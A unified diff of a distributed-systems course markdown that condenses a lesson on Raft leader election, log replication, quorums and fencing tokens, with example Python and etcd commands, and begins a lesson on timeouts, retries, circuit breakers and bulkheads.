+**1. Leader election**
 
-Two operational realities follow from all this. First, **consensus is expensive**, requiring a round trip to a majority for every decision, which is why production systems keep the consensus layer small and use it only for metadata such as who the current leader is, then let the leader serve ordinary traffic without further coordination. This is exactly what Kubernetes does with etcd. Second, **split brain** is the failure this machinery prevents, and it is worth naming: if two nodes both believe they are leader, they accept conflicting writes and the data is corrupted in a way that is very hard to reconcile. Majority quorums prevent it because the minority side cannot reach a majority and therefore cannot elect a leader or commit anything. Fencing tokens, which are monotonically increasing numbers attached to every leader action, are the additional guard that stops a *previously* valid leader whose lease expired during a pause from doing damage when it resumes.
+Followers expect heartbeats. If a randomised election timeout expires without one, a follower increments the term, becomes candidate, votes for itself, and requests votes. A node grants at most one vote per term, and only if the candidate’s log is at least as up to date. Majority of votes → leader. Randomised timeouts break permanent split votes.
 
-Finally, the failure model matters. Everything above assumes **crash faults**, where a node stops or is unreachable but never lies. **Byzantine faults**, where a node sends arbitrary or malicious messages, are strictly harder and require 3f+1 nodes to tolerate f faults rather than 2f+1. This is the domain of blockchains and of safety-critical avionics, and it is usually the wrong model for a datacentre where you control every machine, which is why Raft and Paxos assume the easier one.
+**2. Log replication**
 
-**Mental Model:** Consensus algorithms (Paxos, and its more understandable successor, Raft) work by requiring a **majority** (a quorum) of machines to agree before a decision is considered final - never requiring unanimity. This is a direct, deliberate response to the partition problem: a majority can still make progress even if a minority of machines are unreachable, and requiring a *majority* specifically (not just "any group") guarantees two different majorities can never both make conflicting decisions at once, because any two majorities out of the same set must overlap by at least one machine.
+Clients write to the leader. Leader appends a log entry, ships `AppendEntries` to followers. When a **majority** has stored it, the leader marks it **committed**, applies it to its state machine, answers the client. Followers may catch up later; commit does not wait for every node. A subtle safety rule: a leader does not treat entries from a previous term as committed by replica count alone — that hole is how committed entries can otherwise vanish across a leadership change.
 
-**PICTURE IT LIKE THIS**
+**3. Safety from majority overlap**
 
-A jury doesn't need all twelve members reachable at once to reach a verdict process that's reliable - a well-designed quorum system (a majority) can make a durable decision even if a few jurors step out, while guaranteeing you can never get two DIFFERENT juries reaching two different final verdicts from overlapping members.
-
-**Fault Tolerance - designing for failure as the default, not the exception:** when the amount of work grows, some machine, somewhere, is failing at any given moment - with enough servers, "someone is down right now" stops being an edge case and becomes the normal operating condition. This reframes the whole engineering task: instead of trying to prevent failure (impossible when the amount of work grows), design systems that keep working *correctly* even while some part of them is broken - replication (18.1) so no single machine's data is unique, consensus (above) so the system can still make coordinated decisions without unanimous agreement, and timeouts/retries so a slow or unresponsive machine doesn't stall the whole system indefinitely.
-
-**Further study**
-
-- [MIT 6.5840 (formerly 6.824) - Distributed Systems](https://pdos.csail.mit.edu/6.824/) and its [Spring 2020 lecture playlist](https://www.youtube.com/playlist?list=PLrw6a1wE39_tb2fErI4-WkMbsvGQk9_UB) *(Composio YouTube)* - a full graduate-level course covering RPC, replication, Raft consensus, fault tolerance, and distributed transactions, built around implementing these systems yourself rather than only reading about them
-
-**Internal Working, a Raft election as it happens**
+Any two majorities of the same set share at least one member, so two conflicting decisions cannot both achieve a majority in the same term. That is arithmetic, not timing luck.
 
 ```text
 NORMAL OPERATION, term 4
    [L n1] --heartbeat--> [F n2]
       |   --heartbeat--> [F n3]
-   followers reset their election timers on every heartbeat
+   followers reset election timers on every heartbeat
 
 THE LEADER DIES
    t=0     n1 crashes. Heartbeats stop.
-   t=150ms n2's election timeout fires FIRST (randomised: 150-300ms,
-           and the randomisation is what prevents a permanent
-           split vote)
-           n2: term 4 -> 5, state follower -> candidate,
-               votes for itself, requests votes
+   t=150ms n2's election timeout fires FIRST (randomised: 150-300ms)
+           n2: term 4 → 5, follower → candidate, votes for itself
 
-   n2 --RequestVote(term=5, lastLogIndex=7)--> n3
-   n3 checks:  is term 5 > my term 4?              yes
-               have I already voted in term 5?      no
-               is n2's log at least as current?     yes
-       -> GRANTS the vote
+   n2 --RequestVote(term=5)--> n3
+   n3 checks: higher term? unused vote? log up-to-date? → GRANTS
 
-   n2 now has 2 votes out of 3 = a MAJORITY -> LEADER, term 5
-   n2 immediately sends heartbeats to assert leadership
+   n2 has 2 of 3 = MAJORITY → LEADER, term 5
+   n2 sends heartbeats immediately
 
 THE OLD LEADER RETURNS
-   t=2s  n1 wakes up, still believing it is leader of term 4
-         n1 --heartbeat(term=4)--> n2
-         n2 replies: "my term is 5"
-         n1 sees a HIGHER term -> immediately steps down to follower
-   The term number is what makes this safe. A stale leader cannot
-   do damage because every message it sends is rejected on term.
+   n1 wakes, still "leader" of term 4
+   n1 --heartbeat(term=4)--> n2
+   n2 replies with term 5 → n1 steps down to follower
+   Term number is what makes this safe.
 
-SPLIT VOTE, and why the randomisation matters
-   n2 and n3 both time out at the SAME instant, both become
-   candidates for term 5, each votes for itself: 1 vote each.
-   Neither reaches a majority. No leader is elected.
-   -> both time out again, with NEW random timeouts, and one
-      almost certainly fires first. Randomisation converts a
-      permanent deadlock into a short delay.
+SPLIT VOTE (why randomisation matters)
+   n2 and n3 time out together, both candidates for term 5,
+   each has 1 vote → neither reaches majority → both time out
+   again with NEW random delays → one almost certainly wins.
 ```
 
-**Internal Working, log replication and why majority is the magic number**
+**LOG REPLICATION AND WHY MAJORITY IS THE MAGIC NUMBER:**
 
 ```text
 CLIENT WRITE, term 5, leader n2
 
   client --set x=1--> [n2 leader]
-      n2 appends to its log:  index 8: {term 5, x=1}   NOT committed
+      n2 appends log index 8: {term 5, x=1}   NOT committed yet
       n2 --AppendEntries(8)--> n1, n3
 
-      n3 stores it, acks.        n2 + n3 = 2 of 3 = MAJORITY
-      -> n2 marks index 8 COMMITTED, applies it, replies 200 to client
-      -> n1 catches up later; it does not need to for the commit
-
-  The client got its answer after ONE round trip to a majority.
-  It did NOT wait for every node. That is the whole design.
+      n3 stores + acks.   n2 + n3 = 2 of 3 = MAJORITY
+      → n2 marks index 8 COMMITTED, applies, replies 200
+      → n1 may catch up later; not required for commit
 
 WHY A MAJORITY, SPECIFICALLY
-  Any two majorities of the same set MUST overlap in >= 1 node.
+  Any two majorities of the same set MUST overlap in ≥ 1 node.
 
-     N=5,  majority=3
+     N=5, majority=3
        group A = {n1,n2,n3}      group B = {n3,n4,n5}
-                       \_______________/
-                        n3 is in both
+                        \_______________/
+                         n3 is in both
 
-  n3 cannot vote for two conflicting decisions in the same term,
-  so two conflicting decisions cannot BOTH achieve a majority.
-  Safety comes from arithmetic, not from timing.
+  n3 cannot vote for two conflicting decisions in the same term.
 
 WHY ODD NUMBERS
      N   majority   failures tolerated
      1      1              0
-     2      2              0     <- WORSE than 1 node for writes:
-                                    either failure blocks everything
+     2      2              0   ← worse than 1 for writes
      3      2              1
-     4      3              1     <- 4th node adds cost, not tolerance
+     4      3              1   ← 4th node: cost, not more tolerance
      5      3              2
-     6      4              2     <- same
-     7      4              3
-  Even sizes buy nothing. This is why every cluster you will
-  operate has 3, 5, or 7 members.
 
 SPLIT BRAIN, PREVENTED
-     partition:  {n1, n2, n3} | {n4, n5}
-     majority side (3 of 5):  can elect a leader, can commit
-     minority side (2 of 5):  cannot reach 3. n4 may become a
-         candidate forever and will never win. It CANNOT commit
-         anything, so it cannot corrupt the data.
-     -> the minority side is UNAVAILABLE, not WRONG.
-        That is CP from Phase 85, in its actual mechanism.
+     partition:  {n1,n2,n3} | {n4,n5}
+     majority side: can elect and commit
+     minority side: cannot reach 3 → UNAVAILABLE, not WRONG
+     → CP from Phase 85, as a mechanism
 ```
 
-**Internal Working, the fence that catches a paused leader**
+**FENCING — THE PAUSED LEADER TRAP:**
+
+Quorums alone do not stop a leader that was paused (long GC, VM stall) past a new election, then resumes and writes. **Fencing tokens** (often the term number) travel with every privileged action; the storage resource refuses older tokens. A lock or lease without a fence is incomplete — the holder can be frozen past expiry and still believe it owns the resource.
 
 ```text
-THE BUG that quorums alone do not fix:
-
-  t=0    n1 is leader. It begins writing to shared storage.
-  t=1    n1's process is paused: a long GC pause, a VM migration,
-         a disk stall. It is not dead, it is frozen.
-  t=2    the others time out, elect n2 as leader of term 6.
-  t=3    n2 writes.
-  t=4    n1 RESUMES, with no idea any time passed, and completes
-         its write -- overwriting n2's.
-  -> corruption, from a leader that was legitimately elected
-
-FENCING TOKENS fix it. Every leader action carries its term, and
-the resource itself refuses anything older than what it has seen.
-
-  storage remembers: highest token seen = 6
-
-  n2 writes with token 6   -> 6 >= 6   ACCEPTED
-  n1 writes with token 5   -> 5 <  6   REJECTED
-
-  The resource does not need to know who the leader is, or to
-  participate in the election at all. It only needs to refuse to
-  go backwards. This is the same monotonicity idea as version
-  numbers in 18.1, applied to authority instead of data.
-
-  Lesson: a lock or a lease is not enough on its own, because the
-  holder can be paused past its expiry. The protected resource
-  must also check.
+  t=0  n1 leader, begins write
+  t=1  n1 paused (GC). Not dead — frozen.
+  t=2  others elect n2, term 6
+  t=3  n2 writes with token 6
+  t=4  n1 resumes, completes old write with token 5
+       WITHOUT fencing → corruption
+       WITH fencing: storage highest=6; token 5 REJECTED
 ```
 
-**WHAT YOU GAIN, WHAT IT COSTS, AND WHERE IT CAN FAIL**
+**CRASH VS BYZANTINE (LIGHT):**
 
+Raft assumes **crash faults** (stop or silent) — enough for most datacenters you control (2f+1 nodes for f failures). **Byzantine** faults (nodes lie) need heavier protocols (often 3f+1). Do not reach for BFT for a bookstore inventory service.
 
-| Property                     | Value                                                                         | Why                                                |
-| ---------------------------- | ----------------------------------------------------------------------------- | -------------------------------------------------- |
-| Round trips per decision     | 1 to a majority                                                               | leader appends, majority acks, leader commits      |
-| Latency per write            | the slowest of the fastest majority                                           | you wait for the median node, not the last         |
-| Failures tolerated           | floor((N-1)/2)                                                                | a majority must remain reachable                   |
-| Nodes for f crash faults     | 2f+1                                                                          | 3 tolerates 1, 5 tolerates 2                       |
-| Nodes for f Byzantine faults | 3f+1                                                                          | lying nodes require a larger margin                |
-| Election time                | 1 to 2 election timeouts, typically 150 to 600 ms                             | randomised timeout plus one round of votes         |
-| Throughput ceiling           | one leader's capacity                                                         | all writes funnel through it, by design            |
-| Read cost                    | free from the leader, or a quorum round trip for linearizable reads elsewhere | leases make leader reads safe without coordination |
+**KEEP CONSENSUS OFF THE HOT DATA PATH:**
 
+| Choice | Gain | Cost |
+| ------ | ---- | ---- |
+| 3 nodes | cheapest quorum, lowest latency | tolerates only one failure |
+| 5 nodes | tolerates two failures | every write waits for 3 acks |
+| Nodes in one DC | fast elections | DC is one failure domain |
+| Nodes across regions | survive losing a region | every write pays cross-region RTT |
+| Consensus for all data | strong everywhere | throughput capped at one leader |
+| Consensus for metadata only | cheap, scalable (standard) | data path needs its own correctness argument |
 
+```text
+Good:  etcd/ZooKeeper decides who is primary; primary serves traffic
+Bad:   every "add to cart" waits for a Raft round across regions
 
-| Choice                      | Gain                                     | Cost                                                      |
-| --------------------------- | ---------------------------------------- | --------------------------------------------------------- |
-| 3 nodes                     | cheapest quorum, lowest latency          | tolerates only one failure                                |
-| 5 nodes                     | tolerates two failures                   | every write waits for 3 acks, higher latency              |
-| Nodes in one datacentre     | low latency, fast elections              | the datacentre is a single failure domain                 |
-| Nodes across regions        | survives losing a region                 | every write pays a cross-region round trip forever        |
-| Short election timeout      | fast failover                            | spurious elections during transient slowness              |
-| Long election timeout       | stable under jitter                      | longer unavailability after a real failure                |
-| Consensus for all data      | strong guarantees everywhere             | throughput limited to one leader, at high latency         |
-| Consensus for metadata only | cheap and scalable, the standard pattern | the data path needs its own separate correctness argument |
+Kubernetes cluster state → etcd
+Kafka partition leadership → consensus layer
+Bookstore product reads → not through Raft on every request
+```
 
-
-The trade-off that governs real deployments is the last one, and it is the reason consensus is usually invisible. Running every write through Raft caps your throughput at a single leader with a majority round trip on each operation, which is far too slow for a data path. So production systems use consensus for the small, low-frequency, high-stakes decisions, meaning who the leader is, what the cluster membership is, and what the current configuration says, and then let the elected leader serve ordinary traffic at full speed without consulting anyone. Kubernetes stores cluster state in etcd and does not put pod traffic through it; Kafka uses a consensus layer for partition leadership and not for messages. Recognising that split is what turns consensus from an academic topic into a design tool.
-
-**SMALL WORKING EXAMPLE**
+**ROLE SPLIT REMINDER:** Phase 86 = agreement among replicas. Phase 87 = timeouts/retries/breakers on the *caller* when a dependency is sick — even when consensus elsewhere is healthy.
 
 ```python
-# ===============================================================
-# A Raft election and log replication, small enough to read in one
-# sitting. Not production code: it omits persistence and RPC, and
-# keeps every rule that makes the algorithm SAFE.
-# ===============================================================
-import random, time
-from enum import Enum
-from dataclasses import dataclass, field
+# Majority overlap + odd-size intuition (not a full Raft implementation).
+def majority(n):
+    return n // 2 + 1
 
-class State(Enum):
-    FOLLOWER = "follower"; CANDIDATE = "candidate"; LEADER = "leader"
+def majorities_overlap(n, a, b):
+    need = majority(n)
+    return len(a) >= need and len(b) >= need and len(set(a) & set(b)) >= 1
 
-@dataclass
-class Entry:
-    term: int
-    command: str
-
-@dataclass
-class Node:
-    id: str
-    peers: list[str]
-    state: State = State.FOLLOWER
-    current_term: int = 0
-    voted_for: str | None = None
-    log: list[Entry] = field(default_factory=list)
-    commit_index: int = -1
-    # Randomised, and this is load-bearing: identical timeouts
-    # produce split votes forever.
-    election_timeout: float = field(default_factory=lambda: random.uniform(0.15, 0.30))
-    last_heartbeat: float = field(default_factory=time.time)
-
-    @property
-    def majority(self) -> int:
-        return (len(self.peers) + 1) // 2 + 1
-
-    def last_log_term(self) -> int:
-        return self.log[-1].term if self.log else 0
-
-    def last_log_index(self) -> int:
-        return len(self.log) - 1
-
-class Cluster:
-    def __init__(self, n=5):
-        names = [f"n{i}" for i in range(1, n + 1)]
-        self.nodes = {name: Node(name, [p for p in names if p != name]) for name in names}
-        self.partitions: list[set[str]] = [set(names)]
-
-    def can_reach(self, a, b):
-        return any(a in side and b in side for side in self.partitions)
-
-    def partition(self, *sides):
-        self.partitions = [set(s) for s in sides]
-
-    def heal(self):
-        self.partitions = [set(self.nodes)]
-
-    # ---------- LEADER ELECTION ----------
-    def start_election(self, node_id) -> bool:
-        node = self.nodes[node_id]
-        node.current_term += 1
-        node.state = State.CANDIDATE
-        node.voted_for = node.id
-        votes = 1                                   # always votes for itself
-
-        for peer_id in node.peers:
-            if not self.can_reach(node.id, peer_id):
-                continue                            # unreachable: no vote
-            if self._request_vote(self.nodes[peer_id], node):
-                votes += 1
-
-        if votes >= node.majority:
-            node.state = State.LEADER
-            print(f"  {node.id} WON term {node.current_term} with {votes}/{len(self.nodes)} "
-                  f"(needed {node.majority})")
-            return True
-
-        node.state = State.FOLLOWER                 # lost; stand down
-        print(f"  {node.id} LOST term {node.current_term} with {votes} "
-              f"(needed {node.majority}) -> no leader on this side")
-        return False
-
-    def _request_vote(self, voter: Node, candidate: Node) -> bool:
-        # RULE 1: a higher term always wins; step down and adopt it.
-        if candidate.current_term > voter.current_term:
-            voter.current_term = candidate.current_term
-            voter.voted_for = None
-            voter.state = State.FOLLOWER
-        # RULE 2: never vote in a stale term.
-        if candidate.current_term < voter.current_term:
-            return False
-        # RULE 3: at most ONE vote per term. This is what makes two
-        # conflicting majorities impossible.
-        if voter.voted_for not in (None, candidate.id):
-            return False
-        # RULE 4: never vote for a candidate whose log is behind yours,
-        # or a committed entry could be lost.
-        if (candidate.last_log_term(), candidate.last_log_index()) < \
-           (voter.last_log_term(), voter.last_log_index()):
-            return False
-        voter.voted_for = candidate.id
-        return True
-
-    # ---------- LOG REPLICATION ----------
-    def client_write(self, leader_id, command) -> bool:
-        leader = self.nodes[leader_id]
-        if leader.state is not State.LEADER:
-            print(f"  {leader_id} is not leader; write refused")
-            return False
-
-        leader.log.append(Entry(leader.current_term, command))
-        index = leader.last_log_index()
-        acks = 1                                    # the leader's own copy
-
-        for peer_id in leader.peers:
-            if not self.can_reach(leader.id, peer_id):
-                continue
-            peer = self.nodes[peer_id]
-            if peer.current_term <= leader.current_term:
-                peer.current_term = leader.current_term
-                peer.log = list(leader.log)         # simplified catch-up
-                acks += 1
-
-        if acks >= leader.majority:
-            leader.commit_index = index
-            print(f"  COMMITTED {command!r} at index {index} with {acks} acks")
-            return True
-        # Not committed. The entry stays in the log, uncommitted, and
-        # must NOT be applied or acknowledged to the client.
-        print(f"  NOT committed {command!r}: only {acks} acks, needed {leader.majority}")
-        return False
-
-# --- Demonstration ------------------------------------------------
-print("=== normal election, 5 nodes ===")
-c = Cluster(5)
-c.start_election("n1")
-c.client_write("n1", "set x=1")
-
-print("\n=== leader dies, a follower is elected ===")
-c.partition({"n2", "n3", "n4", "n5"}, {"n1"})       # n1 is isolated
-c.start_election("n2")
-c.client_write("n2", "set x=2")
-
-print("\n=== the old leader tries to write from the minority side ===")
-c.nodes["n1"].state = State.LEADER                  # it still believes it is
-c.client_write("n1", "set x=999")
-print("  -> the minority side cannot commit, so it cannot corrupt anything")
-print("     UNAVAILABLE, not WRONG. This is CP in its mechanism.")
-
-print("\n=== split brain attempt: 3 | 2 partition, both sides try ===")
-c = Cluster(5)
-c.start_election("n1")
-c.partition({"n1", "n2", "n3"}, {"n4", "n5"})
-c.start_election("n1")                              # majority side
-c.start_election("n4")                              # minority side
-print("  at most ONE leader exists, because two majorities of the")
-print("  same 5 nodes must share a node, and no node votes twice.")
-
-print("\n=== split vote, and why timeouts are randomised ===")
-c = Cluster(4)                                      # even, deliberately
-for node in c.nodes.values():
-    node.current_term = 5
-    node.voted_for = node.id                        # everyone voted for self
-c.start_election("n1")
-print("  -> retry with new random timeouts breaks the tie")
-
-print("\n=== fault tolerance by cluster size ===")
+print("overlap safe?", majorities_overlap(5, [1, 2, 3], [3, 4, 5]))
 for n in range(1, 8):
-    maj = n // 2 + 1
-    print(f"  N={n}  majority={maj}  tolerates {n - maj} failures"
-          f"{'   <- adds cost, not tolerance' if n % 2 == 0 else ''}")
-
-# ===============================================================
-# FENCING TOKENS: the guard that catches a paused leader.
-# ===============================================================
-class FencedResource:
-    """The resource itself refuses to go backwards. It does not need
-    to know who the leader is or take part in the election."""
-    def __init__(self):
-        self.highest_token = 0
-        self.value = None
-
-    def write(self, token: int, value) -> bool:
-        if token < self.highest_token:
-            print(f"  REJECTED token {token}: already saw {self.highest_token}")
-            return False
-        self.highest_token = token
-        self.value = value
-        print(f"  accepted token {token}: value = {value!r}")
-        return True
-
-print("\n=== fencing tokens ===")
-storage = FencedResource()
-storage.write(5, "written by n1, term 5")          # n1 is leader
-print("  ...n1 is paused by a 3-second GC pause...")
-storage.write(6, "written by n2, term 6")          # n2 elected
-print("  ...n1 resumes, unaware, and completes its write...")
-storage.write(5, "n1's stale write")               # rejected
-print(f"  final value: {storage.value!r}  <- corruption prevented")
+    print(f"N={n} majority={majority(n)} tolerate={majority(n)-1}")
 ```
 
-```bash
-# Watch a real election. Do this once and the algorithm stops being
-# abstract, because you will see the term number increment.
+**PRACTICE:**
 
-docker run -d --name etcd1 --network raft quay.io/coreos/etcd:v3.5 \
-  etcd --name n1 --initial-cluster n1=http://etcd1:2380,n2=http://etcd2:2380,n3=http://etcd3:2380 \
-       --initial-advertise-peer-urls http://etcd1:2380 \
-       --listen-peer-urls http://0.0.0.0:2380 \
-       --advertise-client-urls http://etcd1:2379 \
-       --listen-client-urls http://0.0.0.0:2379
-# ...repeat for etcd2 and etcd3...
+| Difficulty | Task |
+| ---------- | ---- |
+| Easy | In one sentence: what does consensus buy that “just promote the newest replica” does not? |
+| Medium | Walk a 3-node election: timeout, votes, majority, old leader returns with stale term |
+| Medium | Explain why N=4 often tolerates the same failures as N=3 for majority quorums |
+| Hard | Sketch where bookstore order-service leadership uses consensus vs where Phase 87 patterns protect the checkout API from a sick payments dependency; include why fencing matters for a paused leader |
 
-etcdctl endpoint status --cluster -w table     # shows which node is leader
+**WHAT THIS UNLOCKS NEXT:**
 
-docker pause etcd1                             # freeze the leader, do not kill
-docker logs -f etcd2                           # watch: term increments, a
-                                               # candidate requests votes,
-                                               # a new leader is elected
-etcdctl endpoint status --cluster -w table     # the leader has moved
-
-# Now prove the minority side cannot commit:
-docker network disconnect raft etcd2
-docker network disconnect raft etcd3           # etcd1 alone, 1 of 3
-etcdctl --endpoints=etcd1:2379 put k v         # times out: no quorum
-
-docker unpause etcd1                           # heal and watch it rejoin
-```
-
-**HOW TO EXPLAIN THIS IN AN INTERVIEW**
-
-Deep distributed-systems questions ("how would you build a leader-election mechanism," "what happens if the network partitions your cluster") are less common in general software interviews but common in senior/staff-level and infrastructure-focused interviews - the expected answer connects directly back to the CAP theorem (Phase 85) and the majority-quorum idea above, rather than a memorized algorithm name. The question that is asked most often in that setting is "why a majority rather than any quorum," and the expected answer is the overlap argument: two majorities of the same set must share a member, and no member votes twice in a term, so two conflicting decisions cannot both succeed. Expect "why are clusters always odd-numbered," where the answer is that an even size adds a node's cost and latency without increasing the number of failures tolerated. Expect "what is split brain and what prevents it," where the mechanism is that the minority side cannot reach a majority and is therefore unavailable rather than wrong. A strong candidate raises **fencing tokens** unprompted when locks or leases come up, because it demonstrates awareness that a leader can be paused past its lease expiry and that the protected resource must also check. If FLP impossibility comes up, the useful framing is that real systems keep safety unconditionally and trade away liveness during network trouble, which is why timeouts exist and are hard to tune. And the most practical question, often asked as a follow-up to a system design round, is "would you put this data through consensus," where the expected judgment is no for the data path and yes for metadata such as leadership and configuration.
-
-**PRACTICE UNTIL IT FEELS FAMILIAR**
-
-
-| Difficulty | Task                                                                                                                                                                              |
-| ---------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
-| Easy       | Work through the animation at [The Secret Lives of Data](http://thesecretlivesofdata.com/raft/) end to end and write down the three node states and what triggers each transition |
-| Easy       | For clusters of 3, 4, 5, 6, and 7 nodes, state the majority and the number of failures tolerated, and explain why even sizes are pointless                                        |
-| Easy       | Explain the majority-overlap argument for why two conflicting decisions cannot both commit                                                                                        |
-| Easy       | Explain in three sentences why election timeouts are randomised                                                                                                                   |
-| Easy       | Run the code above and report what happened on the minority side of the 3-2 partition                                                                                             |
-| Medium     | Use [Raftscope](https://raft.github.io/) to kill the leader, watch an election, then partition the cluster and describe which side kept working and why                           |
-| Medium     | Run a three-node etcd cluster, pause the leader, and record the term number before and after the election from the logs                                                           |
-| Medium     | Partition that cluster so one node is alone and demonstrate that writes to it time out. Explain which CAP choice you just observed                                                |
-| Medium     | Extend the code above so that a candidate is refused a vote because its log is behind, and explain what safety property that rule protects                                        |
-| Medium     | Implement fencing tokens against a shared resource and demonstrate a paused leader being rejected on resume                                                                       |
-| Medium     | Explain why a leader must not count an entry from a previous term as committed based on replica count alone                                                                       |
-| Medium     | Measure the failover time of a real etcd or Consul cluster ten times and report the distribution                                                                                  |
-| Medium     | Tune the election timeout too low on a cluster with network jitter, observe the spurious elections, then explain the trade-off you just measured                                  |
-| Hard       | Complete [MIT 6.5840's Raft lab](https://pdos.csail.mit.edu/6.824/labs/lab-raft.html) parts A and B and get the test suite passing                                                |
-| Hard       | Add persistence and log compaction with snapshots to your implementation, and explain why snapshots are necessary rather than merely an optimisation                              |
-| Hard       | Implement linearizable reads two ways, via a quorum read and via a leader lease, and compare the latency and the failure assumptions of each                                      |
-| Hard       | Read [the Raft paper](https://raft.github.io/raft.pdf) in full, then identify the specific scenario Figure 8 illustrates and explain the rule that closes it                      |
-| Hard       | Build a distributed lock service on top of a consensus store, including fencing tokens, and write down every failure mode you handled and every one you did not                   |
-| Hard       | Read one [Jepsen analysis](https://jepsen.io/analyses) of a system that claimed linearizability and failed, and explain the exact bug in your own words                           |
-| Hard       | Explain why Byzantine fault tolerance needs 3f+1 nodes rather than 2f+1, then describe one system you use that assumes each model                                                 |
-
-
-**MASTERY CHECKPOINT FOR PHASE 86:** Explain, in your own words and without notes, why a distributed system can't have perfect consistency and perfect availability during a network partition, and why consensus algorithms require a majority rather than unanimous agreement.
-
-**WHY THE NEXT TOPIC IS NEEDED - Reliability Patterns:** Consensus tells you how machines agree. It does not tell a service how to survive a slow or dead dependency without taking the whole fleet down - timeouts, retries, and circuit breakers. That is Phase 87.
+Agreement exists inside the cluster. Callers still face partial failure: slow dependencies, retry storms, cascading timeouts. Surviving *that* without melting the fleet is Phase 87.
 
 ---
 
@@ -18955,36 +14778,61 @@ Deep distributed-systems questions ("how would you build a leader-election mecha
 
 ---
 
-
-
 # PHASE 87 - Reliability Patterns
 
 **Track:** System Design & Distributed Systems
 
-**WHAT YOU WILL BE ABLE TO DO:** Explain retries, timeouts, and circuit breakers - and the failure mode each pattern prevents *and* the failure mode it can introduce if misconfigured. This is *caller-side* survival, not replica agreement (Phase 86).
+**WHAT YOU WILL BE ABLE TO DO:** Explain retries, timeouts, circuit breakers, and bulkheads — the failure mode each pattern prevents *and* the failure mode it introduces if misconfigured. This is *caller-side* survival, not replica agreement (Phase 86).
 
-**WHAT YOU SHOULD KNOW FIRST:** Phase 84-86 (async and consensus still call unreliable networks), Phase 80 (you need signals to know a dependency is sick), Phase 77 (deploy/rollback is part of surviving bad releases).
+**WHAT YOU SHOULD KNOW FIRST:** Phases 84–86 — async and consensus still sit on unreliable networks. Phase 80 — you need signals to know a dependency is sick. Phase 77 — deploy/rollback is part of surviving bad releases.
+
+**LEARNING RESOURCES:**
+
+- [Circuit Breaker (Microsoft Azure Architecture Center)](https://learn.microsoft.com/en-us/azure/architecture/patterns/circuit-breaker)
+- [Retry pattern (Azure Architecture Center)](https://learn.microsoft.com/en-us/azure/architecture/patterns/retry)
+- [Bulkhead pattern](https://learn.microsoft.com/en-us/azure/architecture/patterns/bulkhead)
+- Resilience4j concepts (circuit breaker, retry, bulkhead) — skim one library overview
 
 ## 87.1 Survive Partial Failure
 
-**WHY YOU ARE LEARNING THIS:** Consensus (86) keeps a *cluster* agreeing. Reliability patterns keep *your service* from melting when a dependency is sick. In a distributed system, **something is always broken**. Retries without backoff amplify outages. Missing timeouts hold threads forever. Without a circuit breaker, a dead dependency takes the whole fleet down. These patterns are how services fail *locally* instead of globally.
+Consensus (86) keeps a *cluster* agreeing. Reliability patterns keep *your service* from melting when a dependency is sick. In a distributed bookstore, **something is always broken** — payments slow, mailer down, search timeout. Retries without backoff amplify outages. Missing timeouts hold threads forever. Without a circuit breaker, a dead dependency takes the whole fleet down. These patterns make services fail *locally* instead of globally. This phase does **not** re-teach CAP.
 
-**SEE IT BEFORE YOU MEMORIZE IT**
+**WHY CALLER-SIDE PATTERNS BECOME NECESSARY NOW:**
 
-- Patterns in practice: [Circuit breaker / resilience intros](https://www.youtube.com/watch?v=aVyCa1RhZIc) *(Composio YouTube)*
-- Written: [Circuit Breaker (Microsoft Azure Architecture Center)](https://learn.microsoft.com/en-us/azure/architecture/patterns/circuit-breaker) *(Composio fetch)*; [Patterns of Distributed Systems](https://martinfowler.com/articles/patterns-of-distributed-systems/) *(Composio fetch)*
-- Library lens: Resilience4j (circuit breaker, retry, bulkhead, rate limiter) *(Composio DeepWiki on resilience4j/resilience4j)*
-- Practice: add a timeout and max-retry budget to one outbound HTTP call in a toy client
-
-**STEP-BY-STEP EXPLANATION**
+Even with a correctly elected leader and a consistent quorum, the checkout API still calls payments over the network. Partial failure looks like: some calls succeed, some hang, some return 503. If every app thread waits forever, the app tier becomes the outage — even though your DB is fine (Phase 82’s wrong-bottleneck lesson, from the other side).
 
 | Pattern | Prevents | Can cause if wrong |
 | ------- | -------- | ------------------ |
 | **Timeout** | Threads stuck on dead peers | False failures if too aggressive |
-| **Retry + backoff + jitter** | Transient blips | Retry storms that melt the dependency |
-| **Circuit breaker** | Repeated calls to a known-bad dependency | Cascading "open" if threshold too sensitive; stuck open if no half-open probe |
-| **Bulkhead** | One pool of work starving all resources | Under-utilization; complex tuning |
+| **Retry + backoff + jitter** | Transient blips | **Retry storms** that melt the dependency |
+| **Circuit breaker** | Repeated calls to a known-bad dependency | Cascading “open” if too sensitive; stuck open without half-open probes |
+| **Bulkhead** | One pool of work starving all resources | Under-utilization; tuning complexity |
 | **Idempotency keys** | Double effects under retry | Key mismanagement / too-short TTL |
+
+**TIMEOUTS — THE FIRST LINE:**
+
+Every outbound call needs a deadline. Without one, a slow payments service holds checkout workers until the whole site looks “down.” The new problem: timeouts that are too tight turn healthy-but-slow into false errors and unnecessary retries.
+
+**RETRIES — HELP AND HARM:**
+
+Retries fix transient network blips and brief leader elections. Unbounded immediate retries turn one slow dependency into a **retry storm**: N app instances × M retries × failing calls = accidental DDoS of the victim.
+
+Rules of thumb:
+
+- Cap attempts (often 2–3 for user-facing paths).
+- Exponential backoff **with jitter** so clients do not align.
+- Retry only **idempotent** or explicitly safe operations (Phase 84).
+- Prefer fail-fast + degrade over hammering.
+
+```text
+WITHOUT JITTER (herd):
+  t=0 fail → all retry at t=100ms → all retry at t=200ms → dependency dies harder
+
+WITH JITTER:
+  retries spread across a window → victim gets a chance to recover
+```
+
+**CIRCUIT BREAKER — STOP CALLING THE DEAD:**
 
 ```text
 Closed ──failures──► Open ──cooldown──► Half-open ──success──► Closed
@@ -18992,9 +14840,28 @@ Closed ──failures──► Open ──cooldown──► Half-open ──succ
                          └── fail fast        └── trial requests
 ```
 
-**Golden rules:** every outbound call has a timeout; retries are capped and idempotent; breakers trip on *error rate / latency*, not a single blip; degrade gracefully (cached value, default, queue for later).
+- **Closed:** calls flow; track error rate / latency.
+- **Open:** fail fast; do not touch the dependency; optionally serve degraded response (cached price, “payments temporarily unavailable”).
+- **Half-open:** allow a few probes; success closes; failure re-opens.
 
-**SMALL WORKING EXAMPLE**
+The new problem: a breaker that opens on one blip flaps; a breaker that never half-opens stays dark forever. Thresholds need Phase 80 metrics — error rate and latency, not a single 500.
+
+**BULKHEADS — LIMIT THE BLAST RADIUS:**
+
+Isolate pools: checkout’s payments client gets its own connection/thread budget so a stuck search indexer cannot consume every worker. The new problem: more pools to size; idle capacity in one bulkhead while another saturates.
+
+**BOOKSTORE CHECKOUT — COMBINED SKETCH:**
